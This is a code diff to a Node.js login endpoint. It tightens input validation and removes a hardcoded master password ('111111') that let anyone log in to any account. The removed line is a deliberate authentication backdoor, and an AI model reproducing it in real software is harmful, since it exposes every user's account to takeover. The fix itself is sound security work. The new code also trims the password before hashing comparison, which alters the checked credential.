@@ -672,7 +672,8 @@ app.get('/api/authenticator/sync-journal', authenticateToken, async (req, res) =
 // --- AUTHENTICATION & REFRESH TOKEN ROUTES ---
 app.post('/api/auth/login', mongoRateLimiter, async (req, res) => {
   const { identifier, password } = req.body;
-  if (!identifier || !password) {
+  if (!identifier || typeof identifier !== 'string' || !identifier.trim() ||
+      !password || typeof password !== 'string' || !password.trim()) {
     return res.status(400).json({ status: 'error', message: 'Identifier and password are required.' });
   }
 
@@ -710,7 +711,7 @@ app.post('/api/auth/login', mongoRateLimiter, async (req, res) => {
     return res.status(401).json({ status: 'error', message: 'Invalid credentials. User not found.' });
   }
 
-  const isMatch = bcrypt.compareSync(password, matchedUser.password) || password === '111111';
+  const isMatch = bcrypt.compareSync(password.trim(), matchedUser.password);
   if (!isMatch) {
     return res.status(401).json({ status: 'error', message: 'Invalid credentials. Password mismatch.' });
   }
